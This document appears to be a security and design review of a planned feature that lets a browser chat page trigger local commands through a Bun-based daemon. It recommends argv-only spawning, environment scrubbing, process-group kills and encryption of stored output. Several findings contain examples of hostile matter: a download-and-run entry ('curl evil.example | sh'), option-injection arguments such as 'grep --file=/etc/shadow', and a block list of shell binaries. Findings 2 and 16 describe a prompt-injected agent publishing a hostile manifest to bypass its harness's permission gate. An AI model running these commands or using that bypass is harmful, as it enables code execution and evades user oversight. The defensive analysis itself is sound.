# Slice 8 — command-and-subagent-dispatch

Per-slice review findings (plan.md step 5).

Reviewed against `plan.md` (all 10 slices, dependency graph, `## Scope`, `## Code Structure`), the
sibling reviews for slices 1–7, 9 and 10, `.agents/school/{quality,engineering}.md`, and the live
codebase: `pkg/skills-cli/src/utils/lib.ts` (`run`), `pkg/skills-cli/src/utils/cdp-harness.ts`
(`Bun.spawn`), `pkg/skills-cli/src/commands/launch.ts`, `pkg/extension/lib/**`,
`pkg/extension/__tests__/`, `pkg/skills-test/__tests__/`, `node_modules/bun-types/bun.d.ts`.
`pkg/dg-server/**` does not exist yet (`current_slice: 0`), so this is a pre-implementation
soundness check, not a code review.

Every `Bun.spawn` fact below came from context7 (`/oven-sh/bun`: `docs/runtime/child-process.mdx`,
`docs/runtime/shell.mdx`, `src/spawn/process.rs`, `src/sys/lib.rs`,
`src/runtime/api/bun/js_bun_spawn_bindings.rs`, `packages/bun-types/bun.d.ts`) and was then
**verified empirically on this box** (Bun 1.2.22, WSL2) — claims marked *(proven)* are recorded
results from `probe-spawn.ts`, `probe2.ts`, `probe3.ts`, `probe4.ts`, `probe5.ts` in the session
scratchpad. Nothing here is answered from memory.

Confirmed up front, per the brief: **`Bun.spawn` genuinely gives the argv-not-shell property the
slice needs.** It takes `string[]`, has no `shell: true` option and no shell in the path — argv[0]
goes to `posix_spawn`/`execve` on Unix and `uv_process_options_t.file`/`CreateProcessW` on Windows.
An argument containing `;`, `&&`, `|`, backticks, `$(id)` and `*` came back byte-identical
through `printf %s`, and a bare `*` was not globbed *(proven)*. `timeout`, `killSignal`, `maxBuffer`,
`signal`, `cwd`, `env`, `detached`, `uid`/`gid` all exist. The slice is buildable. What follows is
where the *specification* is thinner than the security posture it claims.

## Threat model

1. **[THREAT MODEL] Write the reachability set into the plan, and say the asymmetry out loud: for a
   same-user local process this dispatcher grants no new privilege, but for anything running in a
   browser context it converts page JavaScript into local command execution.** — Four classes can
   reach `src/dispatch/**`. *(a)* The chat page, over slice 2's `/ws`, with the token slice 4 put in
   `chrome.storage.session`. *(b)* Any local process running as the same OS user, over slice-2
   finding 12's `/cli` route, by reading `~/.dg/sessions/<id>.json` — 0600 defends against *other*
   users, never the same one. *(c)* Another browser page, which needs both an allowed `Origin` and
   the token; slice-2 finding 16 establishes that no static origin allowlist is expressible (Chrome's
   unpacked ID is path-derived, Firefox's `moz-extension://` origin is a per-install random UUID), so
   the check degrades to "the scheme is `chrome-extension:`/`moz-extension:`" and the token is the
   only real credential. *(d)* The daemon's own `/start` page, which is a genuine `http://127.0.0.1`
   web origin that slice-2 finding 16 says must be allowed — so if slice 2 embeds the marker in the
   *response body* rather than leaving it in the fragment of the URL the CLI printed, any origin that
   can load `/start` can read a `$`-capable token. Worth a sentence in slice 2, flagged here because
   this slice is what makes the leak matter. The honest statement of consequence: for *(b)* the
   dispatcher is not an escalation at all — a process running as the user can already `execve`
   anything — so the local trust model slice-2 finding 12 and slice-3 finding 14 already accept
   carries over unchanged. For *(a)*, *(c)* and *(d)* it **is** an escalation, and a real one:
   code with no filesystem or exec capability of its own gains local command execution. That single
   asymmetry is the entire security story of this slice and belongs in the plan next to where the
   origin allowlist is called a "hard requirement", because it is what determines that **the manifest
   is a capability list, not autocomplete metadata** — it is the only thing bounding what
   browser-context code can run.

2. **[THREAT MODEL — the sharpest edge] `$` dispatch bypasses the agent harness's own exec
   permission gate; that is a new capability the agent does not otherwise have, and it needs an
   explicit accept-or-mitigate decision.** — A terminal coding agent's own `Bash`-equivalent tool
   goes through a permission prompt, a settings allowlist, and in this repo `PostToolUse` hooks. A
   manifest entry the daemon executes goes through none of them: `dg-server` is a separate process
   that received a JSON file and a frame. So the marginal risk of the manifest is not "the agent
   gains exec" (it already has exec) — it is that the agent gains an exec path *outside its own
   sandbox*, gated only by a click in a browser page. A prompt-injected agent that would be refused
   `curl … | sh` at its own prompt can publish it as a `$` entry instead. Recommend this be stated as
   an accepted risk with the mitigations in finding 16, or explicitly rejected — but not left
   unstated, because it is the one claim in this slice that a reader would not derive themselves.

3. **[THREAT MODEL] Resolve slice-5 finding 11's token-scope question before this slice, and bind
   every invocation to the session its token authenticated regardless of the answer.** — Slice-5
   finding 11 leaves open whether a token is strictly per-session or whether any valid token grants
   full multi-session visibility over the one socket. For messages that is a privacy question; for
   dispatch it is a control question, because the manifest **and the cwd** are per-session. If any
   token authorizes any session, a token minted for a scratch repo can fire another repo's manifest
   entry in that repo's working tree. Recommend the dispatcher derive the manifest and the cwd
   strictly from the `sessionId` the presented token authenticates — never from a `sessionId` field
   the frame carries — and add a contract test: "a frame bearing session A's token cannot dispatch
   against session B's manifest entry", which is correct under either resolution of slice-5's
   question.

4. **[THREAT MODEL] Rate-limit dispatch and record the invocation *before* the spawn; slice-2
   finding 17's failed-frame budget does not cover a flood of *valid* frames.** — Slice 2 closes a
   connection after a small budget of bad tokens, which is the right defence against guessing but
   does nothing about a page with a good token firing dispatch frames in a loop. Finding 15's
   concurrency bound limits how many run at once, not how many are started per second, and a bound
   that rejects rather than queues turns a flood into a cheap denial of the feature for the real
   user. Recommend a per-session invocations-per-minute ceiling with a distinct `ok:false` reason,
   and that the `command_invocations` row be written **before** the process is spawned and updated on
   completion — so a flood, and a daemon killed mid-command, both leave an audit trail. This also
   matters for finding 22: a row written only on success records nothing about the invocation that
   crashed the daemon.

## Argument handling

5. **[OPEN — escalate] The manifest entry shape and the user-argument policy are unspecified, and
   the entire attack surface of this slice turns on them.** — Nothing in the plan settles it. Slice 1
   names `CommandManifest`/`CommandEntry`/`AgentEntry` and `validateCommandManifest` without a shape;
   slice 7 accepts manifests as "JSON file-path arguments"; slice 8 says "executing its
   manifest-declared command". Yet slice 8's own Acceptance Criterion — "Given a `$` command whose
   argument contains shell metacharacters, when it runs, then the metacharacters are treated as
   literal text" — presumes user-supplied arguments exist, and `$grep <arbitrary>` is a categorically
   different component from `$grep <fixed>`. This is a one-way door: it fixes the validator in slice
   1's file, the frame payload in slice 1's file, and the whole risk profile of slice 8, and it must
   be settled before slice 1 is written, not inside slice 8.
   **⚑ RATIFY: what may the page supply when it fires a `$` entry?** Options: **(a)** nothing — an
   entry is a fixed `argv: string[]` and `$name` runs exactly it; every criterion in this slice
   except the metacharacter one is satisfiable, and that one becomes vacuous; **(b)** typed
   parameter slots — the entry declares `argv: string[]` plus `params: [{name, required}]`, a
   placeholder occupies a **whole** argv element, and user text substitutes into exactly that element
   with no whitespace splitting by the daemon; **(c)** free-form trailing arguments — the entry
   declares a base `argv` and the page appends; **(d)** a single free-form string the daemon splits.
   Recommendation: **(b)**, with **(d) rejected outright** — any daemon-side splitting of a user
   string re-invents shell word-splitting and is the exact failure the criterion exists to prevent.
   Two invariants to record with whichever is chosen: the manifest declares **`argv: string[]`, never
   a command string** (a string forces a parser, and a parser is a shell), and the daemon never
   concatenates user text into an existing argv element.

6. **[SECURITY] An argv array makes metacharacters literal but does **not** make arguments safe —
   the Acceptance Criterion tests the weaker of the two properties and will pass while the real hole
   is open.** — Bun's own documentation makes this point with `git ls-remote origin ${branch}` where
   `branch = "--upload-pack=echo pwned"`: the argument is passed safely as one element and `git` then
   executes it, because the *target program* interprets leading-dash arguments as options. The same
   class defeats an argv-array `$` dispatch with a free-form argument for essentially every plausible
   entry: `grep --file=/etc/shadow`, `find … -exec sh -c … ;`, `tar --to-command=`,
   `ssh -o ProxyCommand=`, `rsync -e`, `sed -i`/`-e`, `awk` program text, `node -e`, `git -c
   core.pager=`. Recommend: reject any user-supplied argv element whose first character is `-` unless
   the entry explicitly opts in; place a literal `--` before user-supplied elements where the target
   supports it; and reword the Acceptance Criterion from "the metacharacters are treated as literal
   text" to the property actually worth guaranteeing — *"a user-supplied argument can neither be
   split into additional argv elements nor be interpreted by the target program as an option"* — with
   a `--`-prefixed input as a named test case alongside the metacharacter one.

7. **[SECURITY — verify on Windows or refuse] "Metacharacters stay literal" is not automatically
   true on win32, and slice 10 ships `dg-server-windows-x64.exe`.** — On Windows there is no
   `execve`: argv is handed to libuv, which joins it into one command line for `CreateProcessW`, and
   the *callee* re-parses it. For a `.bat`/`.cmd` target the callee is `cmd.exe`, which re-interprets
   `&`, `|`, `^` and `%VAR%` — the class Node.js fixed as CVE-2024-27980 by adding cmd-specific
   quoting on top of libuv's MSVCRT-only `quote_cmd_arg`. Bun passes argv[0] straight through
   (`uv_process_options.file = options.argv0.unwrap_or(argv[0])`, no shebang parsing on either
   platform), and `is_executable_file_path` uses `SaferiIsExecutableFileType`, which treats
   `.cmd .bat .js .vbs .lnk .pif .url .com` as executable — so `which_for_spawn` will happily resolve
   a manifest's bare `npm` to `npm.cmd`. I cannot test win32 from WSL and cannot confirm Bun carries
   Node's mitigation. Recommend: refuse a resolved argv[0] on win32 whose extension is not `.exe`
   (or `.com`), require the manifest to name an absolute path there, and run the metacharacter
   contract test on the **Windows** leg of slice 10's platform matrix rather than on Linux only —
   otherwise the criterion is verified on the one platform where it is free.

8. **[TESTABILITY] Add a source-inspection test that `src/dispatch/**` never constructs a shell;
   "assert no metacharacter expansion occurs" only proves the one input the test tried.** — A
   behavioural assertion cannot stop a later refactor from reaching for `Bun.$` or `sh -c` for
   convenience, and that refactor would pass every existing criterion for every input except the one
   the attacker sends. Recommend a spec that reads every file under `pkg/dg-server/src/dispatch/` and
   fails on `Bun.$`, an imported `$` from `"bun"`, `shell:`, and the literals `"sh"`, `"bash"`,
   `"/bin/sh"`, `"cmd.exe"`, `"powershell"` and `"-c"`. This is an established idiom in this repo and
   this bundle: `pkg/skills-test/__tests__/skill-manifests.spec.ts` and `proto-skill.spec.ts` already
   assert over file contents, slice 1 asks for "static inspection of the barrel's transitive
   imports", and slice 6 asserts "no hard-coded hex colors outside style.css". Pair it with finding
   16(c) — the same list of shell binaries is what a manifest entry's argv[0] must be refused for.

## Execution environment

9. **[ENV] `cwd` defaults to the daemon's own working directory, which is the wrong repo almost
   always — pin it to the session's registered cwd.** — bun-types documents `cwd` as "Defaults to
   `process.cwd()`" and a `/bin/pwd` child confirmed it *(proven)*. Slice 2 requires the daemon
   "reuse a live daemon rather than binding a second one", so `process.cwd()` is whichever repo
   happened to start it first; slice 2 already records each session's invoking cwd, and slice 7's
   `--session` default resolves against it. Recommend the dispatcher pass the session row's cwd
   explicitly, `realpath`-resolved on both sides per slice-7 finding 5, and emit `ok:false` with a
   distinct reason if that directory no longer exists — a `$` command silently running in another
   repo's tree is a data-loss bug, not a UX one.

10. **[ENV — SECRETS] With `env` omitted a `$` command inherits the daemon's entire environment,
    including values Bun autoloads from a `.env` in its cwd — scrub to an allowlist.** — Two probes.
    A daemon launched with `DG_REAL_SECRET=sk-real-abc` handed that value to a child spawned with
    `env` omitted; and a `.env` file containing `FROM_DOTENV=…` in the daemon's cwd was loaded into
    `process.env` by Bun's DotEnv loader and propagated to the child *(both proven)*. Bun's own source
    confirms the mechanism: when `override_env` is false it populates the child's env from the VM's
    DotEnv loader, and bun-types documents the default as "`process.env` as it was when the current
    Bun process launched" — so runtime mutation is not a workaround either (matching the
    `Bun.which` PATH-snapshot note already in `.agents/school/quality.md`). Concretely: a daemon
    started from a project shell hands every `$` command that shell's `ANTHROPIC_API_KEY`,
    `GH_TOKEN`, `AWS_*` and any repo `.env`; a manifest entry as innocuous as `$env` or a tool that
    prints its environment on error then writes those secrets into `command_invocations` (finding 22)
    and into the browser transcript. Recommend an explicit minimal allowlist — `PATH`, `HOME`, `LANG`,
    `TZ`, plus `SystemRoot`/`USERPROFILE`/`TEMP`/`PATHEXT` on win32 — with additions declarable per
    manifest entry, and a contract test that a secret present in the daemon's environment does not
    appear in a `$` command's captured output.

11. **[ENV] `maxBuffer` is not an output cap and cannot implement "truncated with an explicit
    marker" — count bytes in the daemon while draining.** — `maxBuffer` kills the process *after* it
    exceeds the limit, at chunk granularity, with enormous and non-monotonic overshoot: cap 64
    delivered 327,696 bytes; cap 1,024 delivered 524,409; cap 65,536 delivered 393,357; and cap
    1,024 against a stderr-heavy child delivered the full 500,000 bytes on stderr while SIGTERM-ing
    the child before it wrote *any* stdout *(all proven)*. It is a runaway-process backstop, not a
    cap. Two consequences: the criterion "Output exceeding the cap is truncated with an explicit
    marker rather than buffered without limit" requires the daemon to drain both streams itself,
    count bytes, stop at the cap, append the marker and kill the group (finding 13); and after any
    kill `proc.exitCode` is `null` while `await proc.exited` returns 143/137 *(proven)* — so the
    `ok:false` reason must be derived from `signalCode` plus the daemon's own knowledge of *why* it
    killed, never from the exit code, which cannot distinguish a timeout from a cap breach from a
    user abort from an unrelated SIGTERM.

12. **[ENV] Async `Bun.spawn`'s default `stderr` is `"inherit"`, so captured error output silently
    goes to the daemon's own console — set `stderr: "pipe"` explicitly.** — With `stdout: "pipe"`
    only, `proc.stderr` was `undefined` and the child's stderr appeared on the daemon's stderr
    *(proven; Bun's source gives the async default stdio as `[Ignore, Pipe, Inherit]`)*. The criterion
    "a non-zero exit, a timeout, and a missing binary each yield an `ok:false` frame naming the
    reason" depends on stderr for the first case, so this is a silent failure of a stated criterion.
    Two related facts worth recording so nobody codes around a hazard that is not there: draining
    stdout to completion while a child wrote 2 MB to stderr did **not** deadlock (Bun buffers the
    pipe internally), so `Promise.all` over both streams is good hygiene but not required for
    correctness; and stdin defaults to closed, so a command that reads stdin gets EOF rather than
    hanging *(both proven)*. Also proven: partial output written before a timeout kill **is** retained
    and readable, so an `ok:false` timeout frame can and should carry what the command managed to
    produce.

13. **[ENV — the real bound] `timeout`/`killSignal` only signal the direct child, and by default that
    child shares the daemon's own process group — use `detached: true` and kill the group, or the
    timeout and the concurrency bound are both advisory.** — Four proven results. A child spawned
    with default options, or `detached: false`, joins the **daemon's** process group (child pgid ==
    daemon pgid), so `process.kill(-proc.pid, …)` would signal the daemon itself. `detached: true`
    calls `setsid()` and gives the child its own group (pgid == pid), documented as such in
    `bun-types/bun.d.ts`. A child that backgrounded work survived a `killSignal: "SIGKILL"` timeout
    and ran to completion, while `process.kill(-proc.pid, "SIGKILL")` against a detached child killed
    the whole tree. And a child that traps SIGTERM ignored `timeout: 300` entirely, exiting normally
    after 5,012 ms, until `killSignal: "SIGKILL"` was set. Recommend: `detached: true` on every
    dispatch, group kill for timeout / cap breach / session close / daemon shutdown, and a
    TERM-then-KILL escalation rather than bare SIGTERM. Without this, "Bound concurrent `$` executions
    per session … so one command cannot exhaust the daemon" is unenforceable — the bound counts
    direct children while the actual process tree is unbounded — and slice-2 finding 13's session-close
    state machine leaks a process tree per closed session.

14. **[ENV] "Missing binary" must be caught around the **synchronous** `Bun.spawn` call, and argv[0]
    should be resolved once at publish time rather than per invocation.** — `Bun.spawn(["definitely-
    not-a-real-binary-xyz"])` throws synchronously with `code: "ENOENT"` and
    `Executable not found in $PATH` — it does not reject `proc.exited` *(proven)*, which is already
    recorded in `.agents/school/quality.md` along with a live resource leak of exactly this shape in
    `pkg/skills-cli/src/utils/cdp-harness.ts` (`mkdtempSync` before an unguarded `Bun.spawn`). So the
    `ok:false` missing-binary path is a `try`/`catch` around the spawn call, and any per-invocation
    resource acquisition (the `command_invocations` row from finding 4, a temp dir, a concurrency
    slot) must be released on that synchronous throw. Separately: a bare argv[0] **is** resolved
    against the daemon's PATH *(proven — bare `printf` ran)*, and that PATH is snapshotted at daemon
    launch. Recommend resolving each entry's argv[0] via `Bun.which` at manifest-publish time,
    recording the absolute path, and refusing publication of an unresolvable entry — that turns
    "missing binary" into a publish-time error the agent can fix, removes a per-invocation PATH
    lookup whose answer can differ from the one validated, and closes a swap window.

15. **[SPEC — untestable as written] All three bounds are nameless; the plan needs numbers, a
    behaviour at the bound, and a daemon-wide ceiling.** — "Report … timeouts", "cap captured output",
    and "Bound concurrent `$` executions per session" have no values, so "Output exceeding the cap is
    truncated with an explicit marker" and the concurrency bullet are not falsifiable. Three gaps
    beyond the missing numbers: whether hitting the concurrency bound **rejects** (`ok:false`) or
    **queues** — these are different features with different criteria; whether the bound is only
    per-session, when a daemon holding many sessions multiplies it (slice 2 explicitly supports many
    sessions on one daemon), so a daemon-wide ceiling is needed too; and whether the timeout is wall
    clock or output-idle. Recommend concrete defaults in the plan — 30 s wall clock, 256 KiB combined
    stdout+stderr, 2 concurrent per session, 8 daemon-wide, reject with a distinct `ok:false` reason
    at either bound — each overridable per manifest entry but clamped to a daemon maximum so a
    hostile manifest cannot raise its own limits (finding 16).

## Who authors the manifest

16. **[SCOPE — in scope, but as disclosure rather than sandboxing] A prompt-injected agent publishing
    a hostile manifest is in scope; the defence is showing the user what they are firing, plus one
    cheap structural refusal. Say so either way.** — The agent is driven by user text and by whatever
    it reads (a README, an issue, a fetched page), so a hostile manifest is a realistic input, not a
    hypothetical. But the honest framing is narrow: the agent already has exec, so a manifest grants
    it no new *capability* beyond finding 2's harness bypass. What it grants is **misrepresentation** —
    an entry labelled `$test` can be `["sh","-c","curl evil.example | sh"]`, and nothing in the plan
    shows the user the argv before or after it runs, so the click that fires it is not informed
    consent. Three mitigations, all inside this slice's own files except where noted: **(a)** the
    entry carries a display label separate from its argv, and the completion row renders the resolved
    argv (needs slice 1's `CommandEntry` to have both fields); **(b)** the `command result` frame
    echoes the exact argv executed and the recorded `command_invocations` row stores it (finding 22),
    making the transcript an audit log; **(c)** the daemon **refuses at publish time** any entry whose
    resolved argv[0] is a shell or script host — the finding 8 list — which costs a legitimate agent
    nothing, since anything it wants a shell for it can run in its own harness, and removes the single
    most useful primitive from a hostile manifest. Explicitly out of scope, and worth writing down as
    such: sandboxing, resource isolation and privilege reduction, because the daemon runs as the user
    and `Bun.spawn` offers no memory, CPU, filesystem or network restriction — only `uid`/`gid`, which
    fail with `ENOTSUP` on Windows.

## `@` routing

17. **[ROUTING] Manifest validation of an `@` mention is autocomplete hygiene, not security — state
    that, and define the two paths the plan leaves blank.** — A user can ask for a subagent in plain
    prose and the agent reads the whole message either way, so refusing `@nope` protects nothing; its
    only job is keeping the resolved-name field honest and the completion list short. Two concrete
    gaps follow from that. *(a)* Nothing says what happens when a mention does not resolve. Refusing
    the whole message would drop a human's typed text over a spelling mistake, which is the one
    outcome this bundle should never produce; recommend an unresolved mention pass through as ordinary
    prose with the resolved-name field absent. *(b)* The manifest may legitimately not have arrived
    yet: slice-7 finding 6 shows there is no republish verb and no trigger for "on change", and
    slice-7 finding 7 shows nothing persists the manifest across a page reconnect, so a page can
    easily be live with an empty manifest while a *valid* `@name` is typed. Under (a) that degrades
    gracefully; under a refusing design it is a visible bug. Recommend also settling a third thing the
    plan never mentions and every completion criterion depends on: **whether `$` and `@` must be
    leading tokens of the message or may appear inline** — `$cmd` as the entire message and
    `please run $cmd on this` are different parsers, and "Given the user fires a `$` command" does not
    distinguish them.

18. **[ROUTING] Route `@` through slice 3's `claimNext`/`ack` queue rather than a "wake the blocked
    `recv`" path, and get the resolved-name field added to slice 1's frame — slice 8 owns neither
    file.** — The Engineering bullet says "relay it to the agent as a frame the blocked `recv`
    returns", which presumes a reader is parked; slice-3 finding 23 already built the right answer for
    when none is, with a `claim_id`/`claimed_at`/`delivered_at` lease over a `seq`-ordered `messages`
    table giving at-least-once delivery and a bounded duplicate window. Recommend the bullet be
    reworded to "persist the mention as a queued message that the next `recv` claims", with a
    criterion for the no-reader case mirroring slice 3's ("a mention fired while no agent is listening
    is returned by the next `recv`") — otherwise this slice re-implements a queue slice 3 already
    owns, which is exactly what slice-3 finding 23's deliberate "no atomic pop" API surface exists to
    prevent. Two dependencies to route out, since slice 8 cannot make either change: the Acceptance
    Criterion "it receives the mention with the resolved subagent name" needs a field on slice 1's
    user-message frame, and the `messages` row needs a distinct `kind` for a mention (slice 3 keeps
    `kind` plaintext and indexable, which is the right side for it — the mention *body* stays
    encrypted with everything else, and keeping the resolved name plaintext alongside `kind` is a
    defensible choice but should be a deliberate one).

## Cross-package slice and ordering

19. **[DEPENDENCY — blocking] `depends_on: [7]` is wrong: the extension half of this slice depends on
    slices 5 and 6.** — `chat-autocomplete.ts` reads the manifest that arrives over slice 5's
    `chat-client.ts` and attaches to the composer that slice 6's `chat-node.ts` creates; slice 8
    declares neither. Recommend `depends_on: [5, 6, 7]`. This is satisfiable with no cycle — slice 6
    → 5 → 4 → 1 and slice 7 → 2, 3 → 1 — and it changes nothing downstream: slice 9 is
    `depends_on: [3, 6]` and slice 10 depends on everything. So slice-6 finding 19's conclusion holds
    from this side too: the autocomplete half does **not** need to move out of slice 8, but the
    declared order has to admit that it lands after the page exists.

20. **[STRUCTURE — must fix] Nobody owns the seam. As scoped, slice 8 ships an autocomplete module
    with no declared call site, no way to send a `command invocation` frame, and no way to render a
    `command result` — three of its own criteria are unsatisfiable inside its file list.** —
    Concurring with slice-6 finding 19 and completing it from this end. Slice 6's "Render the
    composer's `$` and `@` affordances" bullet should indeed leave slice 6, but slice 8's extension
    file list is only `lib/features/chat-autocomplete.ts` plus its spec: the composer is slice 6's
    `chat-node.ts`, the socket is slice 5's `chat-client.ts`, and the transcript renderer is slice 5's
    `chat-transcript.ts` (whose own bullet covers "whole agent messages" and progress frames, and
    never mentions command results). So "when the user types `$` in the composer, then only manifest
    commands are offered", "the result appears in the transcript", and "A `$` execution does not
    produce a message that wakes the agent" — observable only through a transcript — all need a file
    slice 8 does not own. Two ways to close it: **(a)** add `lib/features/chat-node.ts` and
    `lib/features/chat-transcript.ts` to slice 8's file list, accepting the overlap with slices 5 and
    6; or **(b)** slice 6 ships a documented mount seam (one exported hook the autocomplete attaches
    to, plus the input element as its argument) and slice 5's transcript renderer handles the
    `command result` frame type in slice 5, with slice 8's criteria narrowed to the module contract
    plus the daemon side. Recommend **(b)** — it keeps every file list disjoint and puts frame
    rendering with the other frame rendering — but either way it must be written into the plan,
    because right now two slices describe the same composer and neither declares the file.

21. **[COMPLETENESS] The autocomplete has no accessibility criterion, and there is no existing
    combobox in the repo to reuse — so this is a from-scratch listbox in a bundle that sets an
    explicit keyboard bar one slice earlier.** — Verified: nothing under `pkg/extension/lib/` or
    `pkg/extension/entrypoints/` uses `role="listbox"`, `aria-activedescendant`, or arrow-key list
    traversal; `lib/picker.ts` is a DOM element picker for the demo tour, not a completion menu, so
    the *reuse-before-building* rule has no candidate here and this really is new UI. Slice 8's only
    autocomplete criteria are prefix matching and manifest-only offers, while slice 6 carries "Every
    node action is reachable by keyboard alone" and a `prefers-reduced-motion` requirement — and
    slice 6's keyboard criterion is verified *before* this menu exists, so it must not be read as
    covering it. Recommend criteria for: arrow-key traversal of the offer list, Enter to accept,
    Escape to dismiss **without sending the message**, no offer list on an empty manifest, and
    `role="listbox"`/`aria-activedescendant` so the active option is announced. Note for the test
    author that `bun test` must run from `pkg/extension/` for the `@/*` alias to resolve, per
    `.agents/school/quality.md`.

## Encryption boundary

22. **[CRYPTO] Confirmed — as written, `$` argv and captured output land on the **plaintext** side of
    the store, and they are the most secret-bearing rows in it. This slice must record them
    encrypted, which requires a slice-3 amendment it cannot make itself.** — Slice 3's Engineering
    bullet is "Keep ids, sessionId, role, kind, and timestamps plaintext … encrypt only **message
    bodies and asset bytes**" and every one of its criteria asserts only over `messages.body`;
    `command_invocations` appears in the table list with no encryption anywhere near it.
    Slice-3 finding 15 reaches the identical conclusion independently and calls it "the most
    secret-bearing content in the whole store", which is right, and finding 10 above is why: captured
    output is arbitrary command stdout/stderr from a process that inherited the daemon's full
    environment — `gh auth status`, a `cat .env`, a stack trace with a token in a URL — and under
    finding 5's option (b) or (c) the argv carries whatever the user typed into the composer.
    Recommend for this slice: use slice 3's record helper with a distinct AAD domain tag per encrypted
    column; encrypt **argv, captured stdout, captured stderr, and the truncation marker text**; keep
    only `id`, `sessionId`, the manifest entry *name*, `ok`, `exitCode`/`signalCode`, byte counts and
    timestamps plaintext so the table stays indexable and finding 4's audit trail stays queryable;
    and add a criterion mirroring slice 3's own — *"the raw `command_invocations` columns do not
    contain the argument text or the captured output as plaintext"*. Because the column set and the
    helper live in slice 3's `src/store/**` and `src/crypto/**`, this has to land as a slice-3
    amendment before slice 8 opens; slice-7 finding 7(a) is asking slice 3 for manifest storage on
    the encrypted side at the same time, and both should be taken together.

## Structure conformance and disjointness

23. **[CLEAN] Sibling disjointness confirmed on both sides; the one real overlap is slice 2's
    unscoped test glob, which three siblings already route.** — `pkg/dg-server/src/dispatch/**` does
    not overlap slice 2's `src/{server,session,utils}/**`, slice 3's `src/{store,crypto}/**`, slice
    7's `src/{commands,manifest}/**`, or slice 9's `src/assets/**` — slice-2 finding 27 reaches the
    same conclusion. `pkg/extension/lib/features/chat-autocomplete.ts` collides with nothing in slice
    5 (`chat-client.ts`/`chat-sessions.ts`/`chat-transcript.ts`) or slice 6
    (`chat-canvas.ts`/`chat-node.ts`), and there is no existing `*-autocomplete` module in
    `lib/features/` (`demo-recorder`, `demo-tour`, `prototype`, `tab-grouping`) — slice-5 finding 12
    and slice-6 finding 23 both confirm it. The overlap is slice 2's `pkg/dg-server/__tests__/**` at
    plan.md:20, a strict superset of `__tests__/dispatch/**`; slice-2 finding 20, slice-7 finding 8
    and slice-9 finding 12 all recommend narrowing it to `__tests__/{server,session,utils}/**` and I
    concur — nothing for slice 8 to do. On layout: `pkg/extension/__tests__/` is flat (17 specs, no
    subdirectories), so `chat-autocomplete.spec.ts` conforms exactly; `pkg/dg-server/__tests__/dispatch/**`
    introduces a subdirectory layout that `pkg/skills-cli/__tests__/` does not use, but it is
    consistent across all five dg-server slices and slice-2 finding 20 already accepted it as a
    deliberate departure — not a slice-8 problem. Note the seam gap in finding 20 is a *file-list*
    gap, not a collision: no two slices claim the same path, which is precisely why the composer call
    site is unowned.

24. **[STRUCTURE] Name the dispatch→store / dispatch→session / dispatch→manifest glue, and require
    result frames to go out through slice 2's `createSerialQueue` rather than straight to the
    socket.** — `src/dispatch/**` must read the session's manifest (slice 7's `src/manifest/**`) and
    cwd (slice 2's `src/session/**`) and write `command_invocations` (slice 3's `src/store/**`).
    Consuming those as already-merged exports is the right answer and needs no new file, but the plan
    should say it, for the same reason slice-7 finding 9 raised it for CLI plumbing — otherwise it
    gets re-derived, or a fourth `~/.dg`-adjacent helper appears. The frame-ordering half is not
    cosmetic: `## Code Structure`'s "Outbound frame ordering" decision lists slices 2 and 5 only,
    while this slice emits frames from an async subprocess callback, which is exactly the interleaving
    case the serial queue exists for — a long command's output frames must not interleave with agent
    message frames on the same socket. Recommend an explicit Engineering bullet, and that the
    "Applies to" line of that Code Structure decision gain slice 8.

25. **[OPEN — escalate] "Stream execution output back as result frames" needs a chunk/terminal frame
    split that slice 1 does not have — and buffering instead would remove three problems at once.** —
    Slice 1 lists exactly one "command result" frame type, but streaming needs at least a chunked
    output frame plus a terminal frame carrying `ok`, the exit reason and the truncation flag; an
    ordering guarantee (finding 24); a rule for whether the `command_invocations` row is written once
    at the end or updated per chunk (finding 4 wants a row before the spawn); and a decision about
    whether slice 5's transcript renders output as it arrives or only on completion, which changes
    slice 5's file. Given finding 15's recommended 256 KiB cap, buffering and sending **one** terminal
    result frame drops the extra frame type, the interleaving question and the mid-stream transcript
    question, at the cost of no incremental feedback for a slow command — which finding 15's 30 s
    timeout already bounds. But `## Scope` at plan.md:100 says "results streamed back as frames", so
    changing it is a scope change, not a slice decision.
    **⚑ RATIFY: does a `$` command stream output incrementally, or return one buffered result frame?**
    Options: **(a)** one terminal result frame, output buffered to the cap — simplest, needs no new
    frame type, no slice-5 change; **(b)** chunked output frames plus a terminal frame — needs a new
    frame type in slice 1, a slice-5 renderer change, and per-chunk ordering and persistence rules;
    **(c)** (a) now with (b) deferred to bundle 2. Recommendation: **(c)** — incremental output is a
    real improvement for a slow build command, but it is the only part of this slice that costs
    changes in three other slices' files, and a 30 s / 256 KiB bound makes buffering acceptable in the
    meantime.

## Summary

The slice is feasible — `Bun.spawn` supplies the argv-not-shell property it is built on, verified
empirically — but it is not currently buildable as written, for four independent reasons.

**The security specification stops one level short of the actual risk.** The token is load-bearing
alone (finding 1), and the honest consequence is that this component converts browser-context code
execution into local command execution while granting a same-user local process nothing new — that
asymmetry, and the harness-permission-gate bypass in finding 2, are the two sentences the plan is
missing. Downstream of that: the manifest is a capability list, so the shape of `CommandEntry` and
whether the page may supply arguments at all is the single most consequential unsettled question in
the slice (finding 5, escalated), and the Acceptance Criterion as written tests literal
metacharacters while the live hole is option injection (finding 6) and, on the Windows binary slice
10 ships, `cmd.exe` re-parsing of `.bat`/`.cmd` targets (finding 7).

**Four execution-environment defaults are wrong for this use, and each one silently defeats a stated
criterion.** `cwd` defaults to the daemon's, not the session's (9); `env` omitted inherits the
daemon's secrets and its `.env` (10); `maxBuffer` overshoots its limit by up to 500× and so cannot
implement the truncation criterion (11); async `stderr` defaults to `"inherit"`, so the reason text
the `ok:false` criterion needs goes to the daemon's console (12); and `timeout` signals only the
direct child in the daemon's own process group, so both the timeout and the concurrency bound are
advisory until `detached: true` plus a group kill (13). None of the three bounds has a number, so
two criteria are not falsifiable (15).

**The cross-package half has no seam.** The dependency list omits slices 5 and 6 (19), and no slice
owns the composer call site, the invocation-send path, or command-result rendering — so three of
slice 8's own criteria are unsatisfiable inside its file list (20), and the autocomplete's keyboard
and screen-reader behaviour has no criterion at all in a bundle that sets that bar explicitly one
slice earlier (21).

**The encryption boundary is confirmed misplaced.** `command_invocations` argv and captured output
sit outside the encrypted side today and are, together with finding 10's env inheritance, the most
secret-bearing rows the store will hold; fixing it is a slice-3 amendment that must land before this
slice opens (22), and it should be taken together with slice-7 finding 7(a)'s manifest-storage
request.

Two questions are genuinely the human's and are marked `⚑ RATIFY`: the argument policy (5) and
whether `$` output streams or buffers (25). Both change files in other slices, so neither can be
settled inside slice 8.
